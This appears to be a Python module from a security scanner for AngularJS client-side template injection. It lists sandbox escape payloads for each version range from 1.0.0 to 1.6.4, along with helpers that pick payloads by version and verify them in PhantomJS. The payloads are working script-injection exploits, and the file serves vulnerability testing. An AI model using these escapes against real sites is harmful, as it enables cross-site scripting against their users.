# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Tijme Gommers
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

try: # Python 3
    from urllib.parse import quote_plus
except: # Python 2
    from urlparse import quote_plus

class Payloads:
    """The Payloads class which contains all the AngularJS sandbox escape payloads.

    Attributes:
        __cache (obj): Cached lists of payloads for specific AngularJS versions.
        __payloads list(obj): All the AngularJS sandbox escape payloads.

    """

    __cache = {}

    __payloads = [
        {
            "min": "1.0.0",
            "max": "1.1.5",
            "value": """{{constructor.constructor('alert(1)')()}}"""
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": """{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"""
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}"""
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": """{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"""
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}"""
        },
        {
            "min": "1.2.24",
            "max": "1.2.32",
            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}"""
        },

        {
            "min": "1.3.0",
            "max": "1.3.0",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"""
        },
        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"""
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"""
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": """{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"""
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"""
        },
        {
            "min": "1.4.0",
            "max": "1.4.14",
            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"""
        },
        {
            "min": "1.4.10",
            "max": "1.5.8",
            "value": """{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"""
        },
        {
            "min": "1.5.9",
            "max": "1.5.11",
            "value": """{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}"""
        },
        {
            "min": "1.6.0",
            "max": "1.6.4",
            "value": """{{[].pop.constructor('alert(1)')()}}"""
        }
    ]

    @staticmethod
    def get_for_version(version):
        """Get AngularJS sandbox escape payloads for the given AngularJS version.

        Args:
            version (str): The AngularJS version to get payloads for (e.g. `1.4.2`).

        Returns:
            list(str): A list of payloads.

        """

        if version in Payloads.__cache:
            return Payloads.__cache[version]

        payloads = []

        for payload in Payloads.__payloads:
            if Payloads.version_is_in_range(version, payload["min"], payload["max"]):
                payloads.append(payload["value"])

                # I'm currently not sure if we really need an encoded payload
                # payloads.append(quote_plus(payload["value"]))

        Payloads.__cache[version] = payloads
        return payloads

    @staticmethod
    def version_is_in_range(version, minimum, maximum):
        """Check if the given version is within the given range.

        Args:
            version (str): The AngularJS version to check.
            minimum (str): The minimum version.
            maximum (str): The maximum version.

        Returns:
            bool: True if in range, False otherwise

        """

        version = int(version.replace(".", "").ljust(10, "0"))
        minimum = int(minimum.replace(".", "").ljust(10, "0"))
        maximum = int(maximum.replace(".", "").ljust(10, "0"))

        return version >= minimum and version <= maximum

    @staticmethod
    def get_verify_payload(payload):
        """Replace `alert` with `open` so PhantomJS checks can be done.

        Args:
            payload (str): The current payload.

        Returns:
            str: The new payload.

        Note:
            PhantomJS does not support switching to alerts, which is why we need
            the `open` call, which opens a new window. So if the open window count
            is 2, the payload worked.

        """

        return payload.replace('alert', 'open')
